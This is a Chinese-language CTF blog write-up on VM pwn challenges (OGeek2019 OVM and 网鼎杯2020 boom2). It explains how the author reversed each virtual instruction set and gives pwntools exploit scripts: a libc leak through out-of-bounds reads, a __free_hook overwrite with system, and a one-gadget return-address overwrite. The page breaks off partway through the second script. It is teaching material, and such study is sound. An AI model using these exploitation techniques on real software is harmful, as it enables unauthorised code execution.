@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="Hexo Theme Redefine">
+    <meta name="author" content="hash_hash">
+    
+    <title>
+        
+            VM Pwn记录 |
+        
+        hash_hash&#39;s blog
+    </title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/brands.min.css">
+
+    
+<link rel="stylesheet" href="/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/css/regular.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/css2.css">
+
+    <script id="hexo-configurations">
+    let REDEFINE = window.REDEFINE || {};
+    REDEFINE.hexo_config = {"hostname":"hash-hash.github.io","root":"/","language":"en"};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":false},"first_screen":{"enable":false,"background_image":{"light":"https://evan.beee.top/img/wallhaven-wqery6-light.webp","dark":"https://evan.beee.top/img/wallhaven-wqery6-dark.webp"},"title_color":{"light":"#fff","dark":"#d1d1b6"},"description":"Hash_Hash's blog"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":true},"code_block":{"copy":true,"style":"mac"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"0.4.4"};
+    REDEFINE.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+    
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                hash_hash&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/" >
+                                
+                                    
+                                        <i class="fa-regular fa-house"></i>
+                                    
+                                    HOME
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/archives" >
+                                
+                                    
+                                        <i class="fa-regular fa-archive"></i>
+                                    
+                                    ARCHIVES
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/categories" >
+                                
+                                    
+                                        <i class="fa-regular fa-bookmark"></i>
+                                    
+                                    CATEGORIES
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/about" >
+                                
+                                    
+                                        <i class="fa-regular fa-user"></i>
+                                    
+                                    ABOUT
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/links" >
+                                
+                                    
+                                        <i class="fa-regular fa-link"></i>
+                                    
+                                    FRIENDS
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/" >
+                         
+                            
+                                <i class="fa-regular fa-house"></i>
+                            
+                            HOME
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/archives" >
+                         
+                            
+                                <i class="fa-regular fa-archive"></i>
+                            
+                            ARCHIVES
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/categories" >
+                         
+                            
+                                <i class="fa-regular fa-bookmark"></i>
+                            
+                            CATEGORIES
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/about" >
+                         
+                            
+                                <i class="fa-regular fa-user"></i>
+                            
+                            ABOUT
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/links" >
+                         
+                            
+                                <i class="fa-regular fa-link"></i>
+                            
+                            FRIENDS
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+            <div class="article-title">
+                <span class="title-hover-animation"><h1 style="font-size:2rem; font-weight: bold; margin: 10px 0;">VM Pwn记录</h1></span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">hash_hash</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="pc">2023-01-14 21:11:11</span>
+        <span class="mobile">2023-01-14 21:11</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/vmpwn/">vmpwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <p>之前有听说，最近的hws见过一次，感觉比较有意思，花时间学一学</p>
+<p>vmpwn的题目会比一般的pwn题逆向量上大不少，稳定发挥的话直观上可以有个一两千行的伪代码吧，虽然while循环占据了一大半，但是工作量还是比较大的</p>
+<p>我的做法都是先猜，根据局部的虚拟指令集去猜cp，sp之类的关键寄存器，然后逆向输入解码的流程，搞明白其虚拟指令集的具体作用，然后再去找漏洞。而且vmpwn的漏洞一般比较容易，主要考虑越界读写以及虚拟堆栈上的残余指针，难度还是集中在逆向上</p>
+<p>而且下面做的指令集的vm给我的感觉就是在做计组实验，做标注的时候还复习了一遍risc-v指令?</p>
+<p>还有一种类型是模拟高级语言的题，hws那道就是模拟C的编译器，这一类的题目会比汇编指令的自由度大一点，也更难一些</p>
+<h3 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h3><p>这题算是vm题最简单的那种了，逆向量很低，开局让你输入PC SP，这里没啥注意的，后面中断指令对SP有个检测，给个1就好了，然后输入全部在memory那一块</p>
+<p>重点关注输入到执行的转码</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar_reg_num = (a1 &amp; <span class="number">0xF0000</span>u) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">reg2_num = (a1 &amp; <span class="number">0xF00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">reg1_num = a1 &amp; <span class="number">0xF</span>;</span><br><span class="line">opnum = HIBYTE(a1);</span><br></pre></td></tr></table></figure></div>
+<p>这里的变量名已经根据后面的操作改过了</p>
+<p>部分指令如下</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span> : add</span><br><span class="line"><span class="number">0xB0</span> : xor</span><br><span class="line"><span class="number">0xD0</span> : sr</span><br><span class="line"><span class="number">0xc0</span> : sl</span><br><span class="line"><span class="number">0x90</span> : and</span><br><span class="line"><span class="number">0xA0</span> : or</span><br><span class="line"><span class="number">0x80</span> : sub</span><br><span class="line"><span class="number">0x30</span> : load</span><br><span class="line"><span class="number">0x50</span> : push</span><br><span class="line"><span class="number">0x60</span> : pop</span><br><span class="line"><span class="number">0x40</span> : store</span><br><span class="line"><span class="number">0x10</span> : mov reg, im</span><br><span class="line"><span class="number">0x20</span> : mov reg, (im==<span class="number">0</span>)</span><br><span class="line"><span class="number">0xE0</span> : Exit</span><br><span class="line"><span class="number">0xFF</span> : Halt</span><br></pre></td></tr></table></figure></div>
+<p>其中load，store满足了我们读写内存的需求，并且该题的漏洞在于读写的区间没做限制，导致可以读写到memory之外的内存。调试我们可以发现memory上面是got表，于是可以利用越界读来获取libc基址，然后由于主程序最后free了在memory附近的指针，考虑通过越界写把指针改成<code>__free_hook-0x8</code>，结束后做一次读写往chunk里填<code>/bin/sh\x00+p64(system)</code>即可</p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,26322)</span></span><br><span class="line">p = process(<span class="string">&quot;./vm&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gencode</span>(<span class="params">opcode,tar,src1,src2</span>):</span><br><span class="line">    code = opcode&lt;&lt;<span class="number">8</span></span><br><span class="line">    code = (code+tar)&lt;&lt;<span class="number">8</span></span><br><span class="line">    code = (code+src1)&lt;&lt;<span class="number">8</span></span><br><span class="line">    code = code+src2</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(code)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x70 : add</span></span><br><span class="line"><span class="string">0xB0 : xor</span></span><br><span class="line"><span class="string">0xD0 : sr</span></span><br><span class="line"><span class="string">0xE0 : exit</span></span><br><span class="line"><span class="string">0xc0 : sl</span></span><br><span class="line"><span class="string">0x90 : and</span></span><br><span class="line"><span class="string">0xA0 : or</span></span><br><span class="line"><span class="string">0x80 : sub</span></span><br><span class="line"><span class="string">0x30 : load</span></span><br><span class="line"><span class="string">0x50 : push</span></span><br><span class="line"><span class="string">0x60 : pop</span></span><br><span class="line"><span class="string">0x40 : store</span></span><br><span class="line"><span class="string">0x10 : mov reg, im</span></span><br><span class="line"><span class="string">0x20 : mov reg, (im==0)</span></span><br><span class="line"><span class="string">0xE0 : Exit</span></span><br><span class="line"><span class="string">0xFF : Halt</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;PC: &quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;SP: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;CODE SIZE: &quot;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(gencode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">25</span>))          <span class="comment">#mov r0 , 25</span></span><br><span class="line">sl(gencode(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>))           <span class="comment">#mov r1 , 0</span></span><br><span class="line">sl(gencode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>))           <span class="comment">#sub r2 , r1 , r0 </span></span><br><span class="line">sl(gencode(<span class="number">0x30</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>))           <span class="comment">#ld  r3 , memory[r2]</span></span><br><span class="line">sl(gencode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>))          <span class="comment">#mov r0 , 26</span></span><br><span class="line">sl(gencode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>))           <span class="comment">#sub r2 , r1 , r0</span></span><br><span class="line">sl(gencode(<span class="number">0x30</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>))           <span class="comment">#ld  r4 , memory[r2]</span></span><br><span class="line">sl(gencode(<span class="number">0x10</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0x10</span>))        <span class="comment">#mov r5 , 0x10</span></span><br><span class="line">sl(gencode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>))           <span class="comment">#mov r0 , 8</span></span><br><span class="line">sl(gencode(<span class="number">0xc0</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">0</span>))           <span class="comment">#shl r5 , r5 , r0</span></span><br><span class="line">sl(gencode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xa0</span>))        <span class="comment">#mov r0 , 0xa0</span></span><br><span class="line">sl(gencode(<span class="number">0x70</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">0</span>))           <span class="comment">#add r5 , r5 , r0</span></span><br><span class="line">sl(gencode(<span class="number">0x70</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>))           <span class="comment">#add r4 , r4 , r5</span></span><br><span class="line">sl(gencode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>))           <span class="comment">#mov r0 , 7</span></span><br><span class="line">sl(gencode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>))           <span class="comment">#sub r2 , r1 , r0</span></span><br><span class="line">sl(gencode(<span class="number">0x40</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>))           <span class="comment">#sd  r3 , memory[r2]</span></span><br><span class="line">sl(gencode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>))           <span class="comment">#mov r0 , 8</span></span><br><span class="line">sl(gencode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>))           <span class="comment">#sub r2 , r1 , r0</span></span><br><span class="line">sl(gencode(<span class="number">0x40</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>))           <span class="comment">#sd  r4 , memory[r2]</span></span><br><span class="line">sl(gencode(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))            <span class="comment">#Halt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;R3: &quot;</span>)</span><br><span class="line">re1 = <span class="built_in">int</span>(ru(<span class="string">&quot;\n&quot;</span>),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&quot;R4: &quot;</span>)</span><br><span class="line">re2 = <span class="built_in">int</span>(ru(<span class="string">&quot;\n&quot;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libcbase = (re1&lt;&lt;<span class="number">32</span>)+re2-libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">8</span></span><br><span class="line">lg(<span class="string">&quot;libcbase&quot;</span>,libcbase)</span><br><span class="line">system = libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system)</span><br><span class="line">sla(<span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<h3 id="网鼎杯2020-boom2"><a href="#网鼎杯2020-boom2" class="headerlink" title="[网鼎杯2020]boom2"></a>[网鼎杯2020]boom2</h3><p>一开始分配了一片比较大的空间，然后两个局部变量存了这个地址的偏移，联想到栈，通过读后面的指令发现都有涉及这两变量的变化，一开始还不确定，然后我看到了一段这个</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v_sp = (<span class="type">void</span> **)(v_bp + <span class="number">1</span>);             </span><br><span class="line">v_bp = (__int64 *)*v_bp;</span><br><span class="line">v8 = v_spb;</span><br><span class="line">v_sp = (__int64 *)(v_sp + <span class="number">1</span>);</span><br><span class="line">code = (<span class="type">char</span> *)*v8;</span><br></pre></td></tr></table></figure></div>
+<p>你把bp，sp带进去会发现就是一个<code>leave_ret</code></p>
+<p>之后就是逆指令了，这里得细心一点，一开始看太快了，有个指令的作用想当然了，然后打了一个十分复杂的流程结果超过了输入的量。后面重新逆才发现这个点逆错了，而且是个比较关键的代码</p>
+<p>我先看了<code>*--v_sp = reg;</code></p>
+<p>然后看到了下面这个</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v9 = (__int64 **)v_sp++;<span class="comment">//1</span></span><br><span class="line">**v9 = reg;</span><br></pre></td></tr></table></figure></div>
+<p>然后果断标注<code>push pop</code>后划走，而这里实际上可以实现任意地址写，，，一开始逆错了找了个极其阴间的任意地址写，然后导致输入超了</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v10 = v_sp++;</span><br><span class="line">v11 = (_BYTE *)*v10;</span><br><span class="line">*v11 = reg;</span><br><span class="line">reg = (<span class="type">char</span>)*v11;</span><br></pre></td></tr></table></figure></div>
+<p>并且标注1那里用到了多级指针，看不明白的可以直接看汇编，很容易懂，直接视作一个指针就行</p>
+<p>指令的逆向如下</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00</span> : lea reg <span class="built_in">stack</span>[i]</span><br><span class="line"><span class="number">0x01</span> : next byte -&gt; reg</span><br><span class="line"><span class="number">0x06</span> : push bp; mov bp,sp; sub sp,(im)</span><br><span class="line"><span class="number">0x08</span> : leave_ret</span><br><span class="line"><span class="number">0x09</span> : mov reg,[reg] <span class="comment">//read sth</span></span><br><span class="line"><span class="number">0x0b</span> : bad_pop <span class="comment">//write sth</span></span><br><span class="line"><span class="number">0x0d</span> : push</span><br><span class="line"><span class="number">0x0e</span> : or</span><br><span class="line"><span class="number">0x0f</span> : xor</span><br><span class="line"><span class="number">0x10</span> : and</span><br><span class="line"><span class="number">0x11</span> : eq</span><br><span class="line"><span class="number">0x12</span> : ne</span><br><span class="line"><span class="number">0x17</span> : sl</span><br><span class="line"><span class="number">0x18</span> : sr</span><br><span class="line"><span class="number">0x19</span> : add</span><br><span class="line"><span class="number">0x1a</span> : sub</span><br><span class="line"><span class="number">0x1b</span> : mul</span><br><span class="line"><span class="number">0x1e</span> : <span class="built_in">exit</span></span><br></pre></td></tr></table></figure></div>
+<p>漏洞在于虚拟栈上存了真实栈上的地址，伪代码上没看出来，上手调试发现的。那就比较容易了，用这个地址算出main函数的<code>bp+0x8</code>，任意地址读可以拿到libc基址，然后把og写到这个<code>bp+0x8</code>上就行</p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28329</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./wdb_2020_1st_boom2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x00 : lea reg stack[i]</span></span><br><span class="line"><span class="string">0x01 : next byte -&gt; reg</span></span><br><span class="line"><span class="string">0x06 : push bp; mov bp,sp; sub sp,(im)</span></span><br><span class="line"><span class="string">0x08 : leave_ret</span></span><br><span class="line"><span class="string">0x09 : mov reg,[reg] //read sth</span></span><br><span class="line"><span class="string">0x0b : bad_pop //write sth</span></span><br><span class="line"><span class="string">0x0d : push</span></span><br><span class="line"><span class="string">0x0e : or</span></span><br><span class="line"><span class="string">0x0f : xor</span></span><br><span class="line"><span class="string">0x10 : and</span></span><br><span class="line"><span class="string">0x11 : eq</span></span><br><span class="line"><span class="string">0x12 : ne</span></span><br><span class="line"><span class="string">0x17 : sl</span></span><br><span class="line"><span class="string">0x18 : sr</span></span><br><span class="line"><span class="string">0x19 : add</span></span><br><span class="line"><span class="string">0x1a : sub</span></span><br><span class="line"><span class="string">0x1b : mul</span></span><br><span class="line"><span class="string">0x1e : exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x10a38c</span>-<span class="number">0x21b97</span></span><br><span class="line">code = p64(<span class="number">0x0b</span>)              <span class="comment">#pop-&gt;rsp+8</span></span><br><span class="line">code += p64(<span class="number">0x01</span>)+p64(<span class="number">0xe8</span>)   <span class="comment">#reg = 0xe8</span></span><br><span class="line">code += p64(<span class="number">0x1a</span>)             <span class="comment">#reg = real_bp+0x08</span></span><br><span class="line">code += p64(<span class="number">0x0d</span>)             <span class="comment">#push</span></span><br><span class="line">code += p64(<span class="number">0x9</span>)              <span class="comment">#reg = leak addr</span></span><br><span class="line">code += p64(<span class="number">0x0d</span>)             <span class="comment">#push</span></span><br><span class="line">code += p64(<span class="number">0x01</span>)+p64(offset) <span class="comment">#reg = offset</span></span><br><span class="line">code += p64(<span class="number">0x19</span>)             <span class="comment">#reg = og</span></span><br><span class="line">code += p64(<span class="number">0x0b</span>)             <span 